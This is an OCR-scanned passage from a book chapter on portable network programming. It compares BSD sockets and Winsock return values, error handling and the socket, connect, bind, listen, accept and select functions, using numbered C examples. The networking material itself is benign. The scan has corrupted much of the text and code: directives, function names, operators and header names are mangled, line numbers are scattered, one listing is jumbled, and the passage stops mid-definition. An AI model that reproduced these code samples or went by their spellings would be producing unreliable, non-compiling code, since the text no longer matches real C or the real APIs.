At lines 7 through 19, the ws2_32,!ib dependency is declared using the 
#prngma comment (lib, b'bntmic) statement and the Winsock2.h header file is 
included. 
• 
At lines 31 through 38, Winsock is initialized using the WSAStartitpQ function. 
This is the generic code that must be included before Winsock functions are 
used in any Win32 application. 
Portable Components 
In an effort to detail the components required to create flexible network transmission 
code, the following sections will list, document, and provide examples for network code. 
Return Values 
The UNIX and Windows sockets API define dirferenr return values for most functions. 
On the UNIX platform, a negative value is returned to indicate an error, and a value 
greater than or equal to zero is returned to indicate success. 
On the Windows platform, the WSAStartup function returns a non-zero value to 
indicate an error, and a value of zero to indicate success. The socket function returns the 
constant value lNVALlD__SOCKET to indicate an error and a value type of SOCKET 
that is not equal to INmUD_SOCKET to indicate success. All other functions return 
the constant value SOCKET_ERROR to indicate an error and a value that is not equal 
to SOCKET^ERROR to indicate success. 
As of Winsock 2.0, the IN VALID_SOCKET and SOCKET_ERROR constants 
have a defined value of-/.As such, it is possible to treat these return values in rhe same 
manner as the BSD sockets interface return values.This is not recommended, because 
compiler warnings may be produced when compiling on the Windows platform and if 
the internal structure of the SOCKfTtype is changed in the future, checking for return 
values less than zero may no longer work properly. 
It is possible to handle the return value of the socket function in a cross-platform 
compatible manner by casting the return value of the Winsock version of the socket 
function from type SOCKET to type int, as shown in Example 7.2.The return value 
cm then be treated the same as the BSD sockets equivalent. 
" " > " " Example 7.2 Handling of socketQ Function Return Value 
1 
/* create raw socket, cast return value to int V 
2 
sd 
(int) socket(AF_INET, SOCK_STREAH, 01 i 
3 
if(sd < 0) 

Portable Network Programming • Chapter 7 
277 
4 
t 
5 
printf("socketO failed.\n"); 
6 
return (1),-
7 
> 
8 
9 
print£("socket descriptor created.\n*>; 
Analysis 
At line 2, the socket() function is called and the return value is cast to type int. 
A more reliable method of handling the socket function return value is to use ifdef 
pre-compiler directives as appropriate for the system on which the code is being com-
piled. This is shown in Example 7.3. 
^ p . Example 7.3 Pre-compiler Directives and socketO Function Return Value 
/* create raw socket */ 
2 
sd 
socket(AP_IMET, SOCK_STREAM, 0); 
3 
4 
/* if Win32, check for INVALID_SOCKET constant V 
5 #i£def WIN32 
6 
if(sd =- INVALID_SOCKET) 
7 
/* otherwise, check for -i V 
8 
#else 
9 
if(sd < 0) 
10 #endif 
11 
{ 
12 
printf("socketO failed.\n"); 
13 
return(l) ; 
14 
> 
Analysis 
• 
At line 2, the sotketQ function is called and the return value stored in the vari-
able f(t. 
• 
At lines 5 and 6, an if-dcf pre-compiler directive is used to compare the socket 
descriptor returned from the socket Q function to the Win32-specific 
tNMLID_$OCKBT constant 
value. 
• 
At lines 8 and 9, an else pre-compiler directive is used to compare the socket 
descriptor value to less than zero if the program is compiled on a non-Win32 
platform. 
The return values of the remaining socket functions can be treated in the same 
manner as that of the socket function. Example 7.4 demonstrates the handling of the sct-
sockopt return value as both integer and using ifdef pre-compiler directives. 
""fr"" Example 7.4 setsockoptO Function Return Value 
i 
/* handle return value as integer */ 
2 
ret 
= setsockopUsd, IPPROTO_IPH IP_HDRINCL, 
3 
{const char *) &flgH sizeof (fig) ) ; 
4 
/* check if values is less than zero */ 

278 
Chapter 7 • Portable Network Programming 
5 
if (ret c 0) 
6 
( 
7 
printff "setsockopt() failedAn"); 
8 
return(l); 
9 
) 
10 
11 
/* handle return value using ifdefs */ 
12 
ret 
= setsockopt(sd, IFPROTO„IP, IP_HDRINCL, 
(const char *) iflg, sizeof (fig) ) ; 
14 
/* if Win32, check for SOCKET_ERROR constant «/ 
15 
ttifdef WIN32 
16 
if (ret 
a S0CKET_ERROR) 
17 telse 
18 
/* otherwise, check for value less than zero */ 
19 
i f ( r e t 
< 0) 
20 
ftendif 
21 
( 
22 
printfI"setsockopt() 
failed.\n") ; 
23 
return(l); 
24 
} 
Analysis 
• 
At lines 1 through 10, the setsockopt () function is called and the return value is 
treated as an integer no matter what platform the program is compiled on. This 
is permissible; however, the return value can also be compared to defined con-
stants on the Win32 platform. 
• 
At lines 12 through 24, the same setsockoptQ function is called, but this time the 
return value is handled in a platform-specific manner through the use of if-dcf 
pre-compiler directives. If the program is compiled on a Win32 platform, the 
return value is compared to the SOCKET_ERROR constant value. Otherwise, 
it is compared to less than zero. 
Extended Error Information 
The BSD sockets and Winsock API make extended error information available via dif-
ferent, incompatible methods.The BSD socket's API typically provides extended error 
information via the crnio facility, while the Winsock socket's API provides extended 
error information via the WSAGctLastError function. 
It is necessary to use ifdef pre-compiler directives to conditionally use either the 
ernio facility or WSAGetLasIError function, depending on the platform that the code is 
compiled on. 
Example 7.5 demonstrates the use of ifdcf pre-compiler directives to conditionally use 
either the errno facility or WSAGetLasI Error function to obtain extended error information. 
'•"e,[" Example 7.5 Extended Error Information (errorl.Q 
1 
t * 
2 
* errorl.c 
3 
* 

Portable Network Programming • Chapter 7 
279 
4 
* 
5 
v 
6 
7 
iifdef WIN32 
8 
9 ttpragma comment(lib, "ws2_32.lib") 
10 
#include <winsock2Th> 
11 
12 
(else 
13 
14 
#include <sys/types.h> 
1 5 
ftinclude 
<sy£/socket.h> 
16 
17 
/* required for errno */ 
18 
#include <errno,h> 
19 
20 
#endif 
21 
22 
#include <stdio*h> 
23 
24 1::; 
25 main(void) 
26 { 
27 ttifdef WIN32 
28 
WSADATA wsa; 
29 iendif 
30 
31 
int sd = 0; 
32 
int num = 0 j 
33 
34 /* intialize Winsock if on Win32 */ 
35 iifdef WIN32 
36 
memset(&wsa, 0x0, sizeof(WSADATA)); 
37 
38 
if(WSASEareup[MAKEW0KD(2, 0), &wsa) != 0x0) 
39 
{ 
40 
printf("WSAStartupf) 
failed.\n"); 
41 
return(1); 
42 
} 
43 
#endif 
44 
45 
sd 
= (int) socket(AF_INET, SOCK_STREAM, 0)J 
46 
/* get extended error information using WSAGetLastError() V 
47 
Iifdef WIN32 
48 
if(sd == INVALID_50CKET) 
49 
{ 
50 
nuin = WSAGetLastErrorI); 
51 
#else 
52 
/* get extended error information using errno */ 
53 
if(sd 
< 0) 
54 
{ 
55 
num - errno; 
56 ttendif 
57 
printf("error code #%d\n*, num); 
58 
return(l); 
59 
} 
60 

280 
Chapter 7 • Portable Network Programming 
61 
return(O); 
62 
} 
Analysis 
• 
At lines 7 through 43, Winsock is initialized as described in Example 7.1. 
• 
At line 48, the value returned from the socketQ function is compared to the 
INlALID_SOCKET constant value if the program is compiled on the Win32 
platform. 
• 
At line 50, extended error information is obtained by calling the Win32-spe-
cific WSAGetLastErrori) function if the program is compiled on the Win32 
platform. 
• 
At line 53, the value returned from the socketQ function is compared with zero 
if the program is compiled on a non-Win32 platform. 
• 
At line 55, the value of the global variable ermo is checked for extended error 
information if the program is compiled on a non-Win32 platform, 
The API 
The BSD sockets and Winsock API are largely compatible; however, minor differences in 
data types, function signatures, and required header files prevent complete cross-plat form 
compatibility. 
In the following sections, several of the most common socket functions are detailed 
including function signatures, required header files, and any issue that should be dealt 
with to ensure portability, 
Winsock 2.0 Extensions 
The Winsock 2.0 API defines a number of extended functions including WSASocket, 
IVSAConnect, WSASeud, and more.These functions arc not compatible with the BSD 
sockets programming interface. If portability is a requirement, use of Winsock 2.0-spe-
cific functions is not recommended. 
readO, writeO 
The UNIX read and write system calls can be used with a socket descriptor to receive 
and send data on the UNIX platform. The Win32 rend and write functions cannot be 
used in conjunction with socket descriptors. If portability is a requirement, use of the 
read and write functions to receive and send data is not recommended. 
socketQ 
The UNIX socket function signature and required header files are: 
^include <sys/types. h> 
#include <sys/socket,h> 

Portable Network Programming • Chapter 7 
281 
int 
socket (int domain, int typeH int protocol)t 
The Win32 socket function signature and required header tiles are: 
#include <winsoek2.h> 
SOCKET 
socket (int at, int type, int protocol); 
The socket function is used to create a new socket descriptor. It takes three argu-
ments: the address family of the socket to be created, the type of socket to be created, 
and the protocol to be used with the socket. 
For standard sockets programming, the first argument is always AF_INET.The 
second argument is typically SOCK_DGRAM for UDP sockets or SOCKJSTREAM 
for TCP sockets. For raw sockets, the first and second arguments are always AF_INET 
and SOCK_R.AlV.The third argument varies depending on what the socket will be 
used for. The BSD sockets and Win sock versions of the socket function have different 
return types. The return value must be handled to avoid compilation errors, as discussed 
in the "Return Values" section. Example 7.6 demonstrates the creation of a socket 
descriptor using ifdejpre-compiler directives to include the correct header files and 
handle the return value of the socket function. 
* " " Example 7.6 The socketQ Function (sockethc) 
• 
i . 
-
2 
* socketl.c 
3 * 
4 
* cross-platform compatible example 
5 
* of socket{) function. 
6 
* f 
7 
8 
#i£def WIN32 
9 
10 
/* r e q u i r e d for winsock */ 
11 
ftpragma 
comment(lib, 
"ws2„32.lib"} 
12 
1 3 ft i n c l u d e <v/insoc>:2*h> 
14 
1 5 
f t e l s e 
16 
17 
/* UNIX header files */ 
18 
# i n c l u d e <;sys/ t y p e s . h> 
19 
^ i n c l u d e 
<rsys/socket .h* 
20 
21 
#endif 
22 
23 
/* r e q u i r e d for p r i n t f O 
*f 
24 ft i n c l u d e <:stdioTh> 
25 
26 
int 
27 
main(void) 
28 ( 
29 
*i£def 
Win32 
30 
WSADATA wsa; 
/* used by WSAStartupl) 
V 

Chapter 7 • Portable Network Programming 
31 
SOCKET sd = 0; 
32 telse 
33 
int 
Sd = 0; 
34 #endif 
35 
36 /* must initialize winsock if on Win32 platform V 
37 #ifdef WIN32 
38 
memsetISwsa, 0x0, sizeof(WSADATA)I; 
39 
40 
if(WSAStartup(MAKEWORDt2, 0) , &wsa) 
!= 0x0) 
41 
( 
42 
printf ("WSAStartupO failed. \o"); 
43 
return(l) ; 
44 
} 
45 tendif 
46 
47 
/* create socket descriptor V 
48 
Ed 
= 
SOCket(AF_IWET H 
SOCK_STREAMx 
0}; 
49 
50 
/* if Win32, check for INVALID_SOCKET constant V 
51 #i£de£ WIN32 
52 
iffsd == IHVALIDSOCKET) 
53 
/* otherwise, check for -1 V 
54 
telse 
55 
if(sd 
< 0) 
56 
tendif 
57 
( 
58 
printf("socket(J 
failed.\n M J; 
59 
return(l); 
60 
} 
61 
62 
printf("socket descriptor created.\n"); 
63 
64 
return(0>; 
65 
} 
Analysis 
• 
At line 48, a socket descriptor is allocated using the sockctQ function. 
• 
At lines 51 through 52, the return value from the sockctQ function is compared 
to the IN l/ALlD_SOCKB'l 'constant value if the program is compiled on the 
Win32 platform. 
• 
At lines 54 and 55, the return value from the sockctQ function is compared to 
zero if the program is compiled on a non-Win32 platform. 
connectO 
The UNIX connect function signature and required header files are: 
^include <sys/types rh> 
#include <sys/socket.h> 
#include <netinet/in.h> 

Portable Network Programming • Chapter 7 
283 
int 
connect tint 
s 
const 
struct sockaddr "name 
int 
namelen)j 
The Win32 connect function signature and required header files are: 
#include <winsock2.h> 
int 
connect (SOCKET 
s 
const 
struct sockaddr PAR "name 
int 
namelen) ; 
The connect function is used to connect or define the endpoint for a previously cre-
ated socket descriptor. It takes three arguments: the socket descriptor to be operated on, 
a sockaddr structure defining the endpoint for the connect operation, and the length of 
the sockaddr structure. 
The BSD sockets and Winsock versions of the connect function are compatible aside 
from return values, as discussed in the "Return Values" section. 
Example 7.7 demonstrates the use of the connect function to connect a socket 
descriptor to a remote host and port. 
Example 7.7 The connectQ Function {connectl.c) 
1 /* 
2 
* connectlr c 
3 * 
4 
* cross-platform compatible example of 
5 
* connect{) function. 
6 
v 
7 
8 #ifdef WIN32 
9 
10 /* required for winsock */ 
n 
#pragma comment(lib, "ws2_32.lib") 
12 
13 
((include <rwinsocX2.h> 
14 
15 #else 
16 
17 
f* UNIX header files */ 
18 
# i n c l u d e 
<&¥&/types.h> 
1 9 
# i n c l u d e -csys/socket . h> 
20 
# i n c l u d e < n e t i n e t / i n . h > 
21 
22 
ttendif 
23 
24 
# i n c l u d e < s t d i o , h > 
25 
26 
f* target IP address & port to connect to */ 
27 
((define TARGET_ADER 
" 1 2 7 . 0 . 0 . I " 
28 
Kdefine TARGET_PORT 
135 
29 
30 int 
31 
main(void) 

Chapter 7 • Portable Network Programming 
32 < 
33 
#ifdef WIN32 
34 
WSADATA wsa; 
1* used by wSAStartupO 
*/ 
35 
SOCKET 
sd = 0; 
36 
*else 
37 
int 
sd = 0; 
38 
tendif 
39 
40 
s t r u c t 
sockaddr_in 
s i n 
; 
41 
int 
ret = 0; 
42 
43 /* must initialize winsock if on Win32 platform */ 
44 ttifdef WIN32 
45 
memset(Swsa, 0x0, sizeof (WSADATA) I ; 
46 
47 
if <WSAStartup<MAKEWORD(2, 
0) , 
Swsa) 
!= 0x0) 
48 
{ 
49 
printf ("WSAStartupO 
failed.\n"); 
50 
return(l) ; 
51 
} 
52 
tendif 
53 
54 
/* create TCP socket */ 
55 
sd 
= socket(AF_INET, 
SOCK_STREAM, 
0}; 
56 
/* if Win32, check for INVALID_SOCKET constant V 
57 #ifdef WIN32 
58 
if(sd == INVALID_SOCKET) 
59 
/* otherwise, check for -1 V 
60 telse 
61 
if(sd < 0) 
62 
#endif 
63 
< 
64 
printf("socket() failed,\n") ; 
65 
return(l); 
66 
} 
67 
68 
printf ("socket descriptor created. \ti"); 
69 
70 
/* connect socket to remote host/port */ 
71 
memsett&sin, 0x0, sizeof(sin)); 
72 
73 
sin.sin_family 
= AF_INET; 
74 
75 
/* destination port V 
76 
s i n . s i n _ p o r t 
= 
htons(TARGET_PORT); 
77 
78 
/* destination IP address */ 
79 
sin.sin_addr,s_addr = inet_addr(TARGET_ADDR); 
80 
81 
ret = connect(sd, (struct sockaddr *) &sin, sizeof(sin}) ; 
82 
/* if Win32, check for SOCKET_ERROR constant */ 
83 ttitdef WIN32 
84 
if(ret == SOCKET^ERROR) 
85 
/* otherwise, check for value less than zero */ 
86 
#eise 
87 
i f ( r e t 
< 0) 
88 
tendif 

Portable Network Programming • Chapter 7 
285 
89 
{ 
90 
printf("connect!) failed.\n") ,-
91 
return(l); 
92 
> 
93 
94 
return(O) ; 
95 
] 
Analysis 
• 
At lines 70 through 81, variable initialization and a call to the connect Q function 
arc performed. 
• 
At lines 83 through 87, the return value from the connect{) function is handled, 
depending on the platform that the program is compiled on. in much the same 
manner as Example 7.6. However, for the Win32 platform, most Winsock 
functions aside from the socket () function return the SOCKET_l2RROR con-
stant value if an error occurs. 
bindO 
w«tREss The UNIX bind function signature and required header files are; 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
int 
bindfint 
s 
, 
const 
struct sockaddr 'name 
, 
int 
namelen) ; 
The Win32 bind function signature and required header files are: 
#include <winsock2.h> 
int 
bindlSOCKET 
s 
const 
struct sockaddr FAR "name 
int 
namelen); 
The bind function is used to define the local endpoint to be used in conjunction 
with a socket descriptor. The bind function is typically used for listening sockets, such as 
Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) server 
sockets, and raw sockets used to receive lower-level Internet Protocol (IP) tratFic.The 
function takes three arguments: the socket descriptor to be operated on, a iockaddr struc-
ture that defines the local endpoint to be used, and the length of the sockadit structure. 
The BSD sockets and Winsock versions of the bind function are compatible aside 
from return values as discussed in the "Return Values" section. 
Example 7.8 demonstrates use of the bind function to bind a socket descriptor to all 
local addresses. 
( V h t t E S ! 

286 
Chapter 7 • Portable Network Programming 
Example 7.8 The bind() Function (bindl.c) 
1 
/* 
2 
* bindl.c 
3 * 
4 
* croas-platform compatible example of 
5 
* bindO function. 
6 »/ 
7 
8 
ttifdef WIN32 
9 
10 
/* r e q u i r e d for winsock */ 
11 ttpragma. comment { l i b H 
"ws2_32,lib M) 
12 
13 #include <winsock2. h> 
14 
15 telse 
16 
17 
/* UNIX header files */ 
18 
ttinclude 
< s y s / t y p e s , h> 
19 
(finclude 
< s y s / s o c k e t . h > 
2 0 
t t i n c l u d e 
<:netinet/in*h> 
21 
22 
ffendif 
23 
24 
# i n c l u d e < s t d i o . h > 
25 
26 
/* l o c a l p o r t to bind to */ 
27 
tdefine 
LOCAL_PORT 
1234 
28 
29 inc 
30 
main (void) 
31 t 
32 
ttifdef WIN32 
33 
WSADATA wsa; 
/* used by WSAStartupO 
*/ 
34 
SOCKET 
sd = 0; 
35 
ttelse 
3 6 
i n t 
sd = 0; 
37 
ffendif 
38 
39 
s t r u c t sockaddr_in s i n 
; 
4 0 
i n t 
r e t = 0; 
41 
42 
/* must initialize winsock if on Win32 platform V 
43 
ttifdef WIN32 
44 
memsetl&wsa, 0x0, sizeof (WSADATA) ) ; 
45 
46 
if(WSAStartup(MAKEWORC(2, C), &wsa) 
! = 0x0) 
47 
t 
48 
p r i n t f ("WSAStartupO 
f a i l e d . \ n " ) ; 
4 9 
r e t u r n ( l ) ; 
50 
) 
51 
ttendif 
52 
53 
/* c r e a t e UDP socket V 
54 
sd 
= socket (AF_INET. EOCK_DGRAH, 0) ; 
55 
/* if Win32, 
check for INVALID_EOCKET c o n s t a n t */ 
56 
ttifdef WIN32 

Portable Network Programming • Chapter 7 
287 
57 
if(sd == INVALID_SOCKET) 
58 
/* o t h e r w i s e , 
check for -1 */ 
59 
#else 
60 
if(sd 
< 0) 
61 
#endif 
62 
{ 
63 
printf("sockets) 
failed.\n")j 
64 
return(1); 
65 
} 
66 
67 
printf("socket descriptor created.\n"); 
68 
69 
/* bind socket to local port */ 
70 
71 
memset(isin, 0x0, sizeof(sin)); 
72 
73 
sin. 
sin_f 
amily 
= AF_INET; 
74 
75 
/* port to bind to */ 
76 
sin.sin_port 
= htons(LOCAL_PORT); 
77 
78 
/* make available on all interfaces/addresses */ 
79 
sin.sin_addr.s_addr 
= INADDR_ANY? 
80 
81 
/* bind socket */ 
82 
ret = bind{sd, 
(struct sockaddr *) &sin, sizeof(sin)); 
83 
lifdef WIN32 
84 
i f ( r e t == SOCKET_ERROR) 
85 ftelse 
86 
i f l r e t 
< 0) 
87 
#endif 
88 
{ 
89 
printf("bindO 
failed.\n"); 
90 
return(l); 
91 
} 
92 
93 
return(O); 
94 
) 
Analysis 
• 
At lines 71 through 82, variable initialization and a call to the bindQ function 
are performed. 
• 
At lines 83 through 86, the return value from the bindQ function is handled in 
the same manner as that of the connectQ function in Example 7.7. 
HstenO 
The UNIX listen function signature and required header files are: 
#include <sys/types.h> 
#include <sys/socket .h> 
int 
listenfint 
s, 
int backlog); 

288 
Chapter 7 • Portable Network Programming 
The Win32 Usten function signature and required header files are: 
#include <winsock2,h* 
i n t 
listen(SOCKET s, 
lilt b a c k l o g ) ; 
The listen function is used to set a previously bound socket to a listening state, and 
to set the connection backlog count. This function is typically used to set a previously 
bound socket descriptor of type SOCK_STREAM into a listening state before calling 
the accept function to receive new connections. 
The Usten function takes two arguments: the socket descriptor to be operated on and 
an integer value indicating the number of connections to backlog before denying new 
connections. The BSD sockets and Winsock versions of the Usten function are compat-
ible aside from return values, as discussed in the ''Return Values" section. 
Example 7.9 demonstrates the use of the listen function to set the backlog of a pre-
viously bound socket descriptor. 
""M>" Example 7.9 The HstenO Function (listenlx) 
• • 2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
/* 
* l i s t e n l . c 
* 
* Cross--platform compatible 
exan 
* l i s t e n ( ) 
f u n c t i o n . 
*/ 
ttifdef WIN32 
/* r e q u i r e d for winsock */ 
ttpragma comment(lib, 
Mws2_32.1ib") 
^ i n c l u d e 
ftelse 
<winsock2. h> 
/* UNIX header files */ 
ftinclude 
ifinclude 
# i n c l u d e 
t e n d i f 
frinclude 
/ * 
l o c a l 
# define 
tt define 
i n t 
< s y s / t y p e s . h > 
<sy%!socket.h> 
t n e t i n e t / i n . h > 
< s t d i o . h > 
p o r t to bind to */ 
LOCAL_PORT 
1234 
BACKLOG 
10 
main(void) 
( 
ftifdef 
WIN32 
WSADATA wsa; 
1* used by Wi 
SOCKET 
sd = 0; 
t e l s e 

Portable Network Programming • Chapter 7 
289 
37 
int 
sd = 0; 
38 
#endif 
39 
40 
struct sockaddr_in sin ; 
41 
int 
ret = 0; 
42 
43 /* must initialize winsock if on Win32 platform */ 
44 Kifdef WIN32 
45 
memset(fcwsa, 0x0, sizeof(WSADATA)); 
46 
47 
if<WSAStartup[HAKEWORD<2, 0), &wsa) != 0x0) 
48 
{ 
49 
printE("WSAStartup0 failed.\n"); 
50 
return(l) ; 
51 
) 
52 
#endif 
53 
54 
/* create TCP socket */ 
55 
sd 
= socket(AF_INET, SOCK_STREAM, 0); 
56 
/* if Win32, check for INVALID_SOCKET constant */ 
57 
#i£def WIN32 
58 
if(sd == INVALID_SOCKET) 
59 
/* otherwise, check for -1 V 
60 
#else 
61 
if(sd 
< 0) 
62 
#endif 
63 
{ 
64 
printf("sockets} 
failed.\n"); 
65 
return(1); 
66 
} 
67 
68 
printf("socket descriptor created.\n"); 
69 
70 
/* bind socket to local port */ 
71 
72 
memset (Cisin, 0x0, sizeof (sin) ) ; 
73 
74 
sin. sin_faifLily 
• AF_INET; 
75 
76 
/* port to bind to */ 
77 
sin.sin_port 
= htons (LOCAl,_PORT) ; 
78 
79 
/* make available via a l l interfaces */ 
80 
sin. sin_addr. s_addr 
= INADDR_ANY; 
81 
82 
/* bind socket */ 
83 
ret = bindtsd, 
(struct sockaddr *) &sin, sizeof(sin)); 
84 
ttifdef WIN32 
85 
i f ( r e t == SOCKET_ERROR) 
86 
#else 
87 
iffret 
< 0) 
88 
#endif 
89 
{ 
90 
printf("bind!) 
failed.\n"); 
91 
return(1); 
92 
} 
93 

290 
Chapter 7 • Portable Network Programming 
94 
printf[-socket boundi\n"); 
95 
96 
/* set backlog using l i s t e n 0 
function, 
97 
set socket into listening state V 
98 
ret = listenisd, BACKLOG); 
99 
ttifdef WIN32 
100 
if (ret == S0CKET_ERROR) 
101 #else 
102 
i f ( r e t 
< 0) 
103 #endi£ 
104 
( 
105 
printf ( "listen!) failed. \n") ; 
106 
return(l) ; 
107 
} 
108 
109 
printf I "listen!) ok!\n"); 
110 
1 1 1 
return(O); 
112 ) 
Analysis 
• 
At line 98, the listenQ function is called. 
• 
At lines 99 through 102, the return value from the listenQ function is handled 
in the same manner as that of the connect Q function in Example 7.7. 
acceptO 
The UNIX accept function signature and required header files are: 
^include <sys/types. h> 
9 include <sys/socket.h> 
^include <netinet/in.h> 
int 
accept (int 
s 
, 
struct sockaddr *addr 
, 
int 
*addrlen); 
The Win32 accept function signature and required header files are: 
#include <winsock2. h> 
SOCKET 
accept (SOCKET 
s 
, 
struct sockaddr FAR *addr 
int FAR 
*addrlen); 
The accept function is used to receive new connections from a previously bound and 
listening socket descriptor. The function takes three argtunents: the socket descriptor 
identifying the bound and listening socket, a sockaddr structure in which the address of 
the connecting host is stored, and the length of the sockaddr structure. 
The BSD sockets and Winsock versions of the accept function are compatible aside 
from return values as discussed in the "Return Values" Section. 

Portable Network Programming • Chapter 7 
291 
Example 7.10 demonstrates the use of the accept function to receive a newTCP 
connection. 
!"•*»"• Example 7.10 The acceptQ Function (accepthc) 
\ 
t* 
2 
* acceptl. c 
3 * 
4 
* cross-platform compatible example of 
5 
* acceptl) function. 
6 */ 
7 
8 
Sifdef WIN32 
9 
10 
I* required for winsock */ 
11 #pragma comment(lib, "ws2_32.lib"} 
12 
13 #include <winsock2.h> 
14 
15 #else 
16 
17 
/* UNIX header 
files 
V 
18 
# i n c l u d e <:sys/types. h> 
19 
# i n c l u d e <^sys / s o c k e t .h> 
2 0 
Sinclude 
< n e t i n e t / i n . h > 
21 
22 #endif 
23 
24 #include <stdioTh> 
25 
26 
/* 
l o c a l p o r t to bind to 'I 
27 
* 
define 
LOCAL_PORT 
1234 
28 
#define 
BACKLOG 
10 
29 
3 0 
i n t 
31 
Enain (void) 
32 { 
33 
ftifdef 
WIN32 
34 
WSADATA wsa; 
/• used by WSAStartupO 
V 
35 
SOCKET 
sd = 0; 
36 
SOCKET cl = 0; 
f client socket •/ 
37 #else 
38 
int 
sd = 0; 
39 
int 
el = 0; /* client socket V 
40 ftendif 
41 
42 
s t r u c t sockaddr_in s i n 
[ 
43 
Lnt 
len = s i z e o f ( s i n } ; 
/* r e q u i r e d for accept() 
*/ 
4 4 
i n t 
r e t = 0; 
4 5 
46 
1* must initialize winsock if on Win32 platform */ 
47 tifdef WIN32 
48 
memseM&wsa, 0x0, sizeof (WSADATA) ) ; 
49 
50 
if<WSAStartup(HAKEWORD(2, 0) , Siwsa) 
!= 0x0) 
51 
( 
52 
printf ("WSAStartupO failed.\n") ; 

Chapter 7 • Portable Network Programming 
53 
return(l) ; 
54 
} 
55 
tendif 
56 
57 
/* create TCP socket */ 
58 
sd 
= socket(AF_INET, 
SOCK_STREAM, 0 ) ; 
59 
/* if Win32, check for IWALID_SOCKET constant *i 
60 
tifdef WIN32 
61 
if(Sd == INVALID_SQCKET) 
62 
/* otherwise, check for -1 */ 
63 #else 
64 
if (sd < 0) 
65 tendif 
66 
{ 
67 
printf("socket() failed.\n"); 
68 
return(l); 
69 
} 
70 
71 
prirttf I "socket descriptor created. \n") ; 
72 
73 
/* bind socket to local port V 
74 
75 
memset(&sin, 0x0, sizeof(sin)); 
76 
77 
$in.siTl_faniily 
= AF_INET? 
78 
79 
/* port to bind to V 
80 
sin.sin_port 
= htons(LOCAL_F0RTI; 
81 
82 
/* make available via all interfaces */ 
83 
sin.sin_addr. s_addr 
= INADDR_ANY; 
84 
85 
/* bind socket */ 
86 
ret = bind(sd, (struct sockaddr *) tsin, sizeof(sin)); 
87 
fifdef WIN32 
88 
i f ( r e t == S0CKET_ERRORI 
89 
#else 
90 
if (ret <: 0] 
91 
tendif 
92 
( 
93 
printf("bindO failed. \n">; 
94 
return(1); 
95 
} 
96 
97 
printf("socket bound;\n"); 
98 
99 
/* set backlog using listenO 
function V 
100 
ret = listen(sd, BACKLOG); 
101 frifdef WIN32 
102 
if (ret == S0CKET_ERR0R) 
103 telse 
104 
i f ( r e t 
< 0) 
105 #endif 
106 
( 
107 
printf ( " listen () failed. \n") ; 
108 
return(l) ; 
109 
} 

Portable Network Programming • Chapter 7 
293 
110 
1 1 1 
p r i n t f ( " l i s t e n ( ) 
o k ! \ n " l ; 
112 
113 
ci 
= accepMsd, (struct sockaddr *) &sin, &len) ; 
114 lifdef WIN32 
115 
if(cl == SOCKET_ERROR) 
1 1 6 
: • • • : ' < • 
117 
if(cl 
< 0) 
118 #endif 
119 
c 
120 
printf("acceptO 
failed.\n"); 
121 
return (1) ; 
122 
} 
123 
124 
print f. ("connection received. \n") ; 
125 
1 26 
return(O) ; 
127} 
Analysis 
• 
At line 113, the acceptQ function is called. 
• 
At lines 114 through 117, the return value from the acceptQ function is handled 
in the same manner as that of the connect Q function in Example 7.7. 
selectO 
The UNIX select function signature and required header files are: 
finclude <sys/types.h> 
#include <sys/soeket .hs-
int 
select{int 
fd_set 
fd_set 
fd_set 
const 
struct timeval *timeout ); 
The Win32 select function signature and required header files are: 
#include <winsock2.h> 
int 
s e l e c t d n t 
fd_set PAR 
£d_set FAR 
fd_set FAR 
const 
struct timeval FAR *timeout ); 
The select function is used to determine the state of multiple socket descriptors. The 
function takes five arguments: 
nfds 
Teadfds 
* w r i t e f d s 
, 
*exceptfds, 
nfdS , 
*readfds 
*writefds , 
*exceptfds, 

294 
Chapter 7 • Portable Network Programming 
• 
nfds The value of the high est-numbered socket descriptor plus one to be 
passed to the function 
• 
re a did s A fd_sct structure containing a list of socket descriptors to be 
returned when at least one socket descriptor can be read from 
• 
writefds h.fi_set structure containing a list of socket descriptors to be 
returned when at least one socket descriptor can be written to 
• 
execptfds A fd_sct structure containing a list of socket descriptors to be 
checked for error conditions 
• 
timeout A timeval structure containing the number of seconds and microsec-
onds to wait for at least one socket descriptor to become ready for processing 
If the time value specified in the titttet'til structure passes and there is no change in 
the state of socket descriptors passed to the function, a value of zero is renamed indi-
cating that a timeout has occurred. 
The BSD sockets and Winsock versions of the select function are mostly compat-
ible. The only significant difference is that the value of first argument, nfds, is ignored by 
the Winsock version of the select function. This presents an issue, because the BSD 
sockets version of the select function is passed the value of the highest numbered socket 
descript plus one for the nfds argument.The BSD sockets API defines socket descriptors 
as type itit, so adding the value of one to a socket descriptor compiles fine because both 
the socket descriptor and the value of one are of the same type. However, since Winsock 
defines socket descriptors as type SOCKET, compiler warnings will be produced if an 
attempt is made to add an integer value to a socket descriptor. 
^ t ^ ^ 
Here is an example of the sclectQ function for BSD sockets; 
i n t r e t = 0; 
sd = socket [AF_JINET, SOCK_STREAM, 
0 ) ; 
/* this will compile with no warnings using 
the BSD sockets API */ 
ret = selectfsd + 1, NULL, NULL, NULL, NULL)i 
N&""s 
Here is an example of the sekctQ function for Winsock: 
i V N t, R L i S 
SOCKET Ed = 0; 
int 
ret = 0; 
sd = socket(AF_INET, SOCK_STREAM, 0); 
J* this will give compiler warnings when 
using the Winsock API */ 
ret = selected + 1, NULL, NULL, NULL, NULL) ; 
The solution is to use pre-compiler directives to conditionally supply the first argu-
ment to the select function, as is demonstrated at lines 114 and 120 in Example 7.11. 

Portable Network Programming • Chapter 7 
295 
! " « M ' " 
Example 7.11 The selectQ Function (selectl.c) 
1 (* 
2 
* selectl.c 
3 * 
4 
* cross-platfarm compatible example of 
5 
* select() function, 
6 
v 
7 
8 
Sifdef WIN32 
9 
10 
i* 
r e q u i r e d for winsock «/ 
11 
#pragma comment t l i b , 
"ws2_32 . lib 4 1) 
12 
1 3 
# i n c l u d e <winsock2.h> 
14 
1 5 
# e l s e 
16 
17 
f* UNIX header files */ 
18 #include <sys/types.h> 
19 ((include <sys/socket .h> 
20 
#include <netinet/in.h? 
21 
#include <sys/tinieTh^ 
22 
2 3 
Sendif 
24 
2 5 
# i n c l u d e < s t d i o . h > 
26 
27 
/* 
l o c a l p o r t to bind to */ 
28 
Sdeflne 
LOCAL^PORT 
1234 
29 
30 
f* 
r e c e i v e buffer l e n g t h */ 
31 
idefine 
